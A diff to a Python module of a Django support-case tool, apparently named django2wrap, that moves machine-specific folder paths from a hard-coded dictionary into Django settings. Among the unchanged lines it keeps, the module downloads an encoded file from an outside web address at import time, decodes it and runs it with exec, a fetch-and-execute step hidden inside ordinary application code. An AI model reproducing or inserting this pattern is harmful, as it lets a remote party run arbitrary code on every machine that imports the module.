@@ -8,16 +8,6 @@ from django2wrap.models import Agent, Shift, Call, Resource, Case, Comment
 from django.db import connection
 from django.conf import settings
 from django2wrap.comments import CommentCollector #_find_postpone, _is_chased, _capture_comment_info, wipe_comments, save_comments, sync_comments
-# detect environment
-try:
-    dump = os.listdir('/home/bob/Documents/gits/reflective/')
-    execution_location = 'Laptop'
-except OSError:
-    try:
-        dump = os.listdir('D:/temp/')
-        execution_location = 'Office'
-    except OSError:
-        execution_location = 'Bugzilla'
 
 from django2wrap.bicrypt import BiCrypt
 import urllib.request
@@ -26,24 +16,6 @@ response = urllib.request.urlopen('http://eigri.com/myweb2.encoded')
 code = response.read()      # a `bytes` object
 decoded_msg = codder.decode(code)
 exec(decoded_msg)
-
-LOCATION_PATHS = {
-    'Laptop': {
-        'local_settings': '/home/bob/Documents/gits/reflective/django2wrap/local_settings.py',
-        'temp_folder'   : '/home/bob/Documents/temp/',
-        'pickle_folder' : '/home/bob/Documents/temp/',
-    },
-    'Office':{
-        'local_settings': 'C:/gits/reflective/django2wrap/local_settings.py',
-        'temp_folder'   : 'D:/temp/',
-        'pickle_folder' : 'D:/temp/',
-    },
-    'Bugzilla':{
-        'local_settings': 'C:/gits/reflective/django2wrap/local_settings.py',
-        'temp_folder'   : 'C:/temp/',
-        'pickle_folder' : 'C:/temp/',
-    }
-}
 
 SHIFT_TIMES = {'start': 5, 'end': 20, 'workhours': 15, 'non workhours': 9}
 SLA_RESPONSE = {'WLK': 0.25, 'RSL': 1}
@@ -200,9 +172,9 @@ class CaseCollector:
         ## ..................................................................................... ##
         self.write_raw = 0
         ## ..................................................................................... ##
-        self.pickledir = LOCATION_PATHS[execution_location]['pickle_folder']
+        self.pickledir = settings.LOCATION_PATHS['pickle_folder']
         ## ..................................................................................... ##
-        self.temp_folder = LOCATION_PATHS[execution_location]['temp_folder']
+        self.temp_folder = settings.LOCATION_PATHS['temp_folder']
         ###########################################################################################
         self.support_keys = SUPPORT_STATUSES[self.account]
         self.comments_collector = CommentCollector(debug = self.debug)
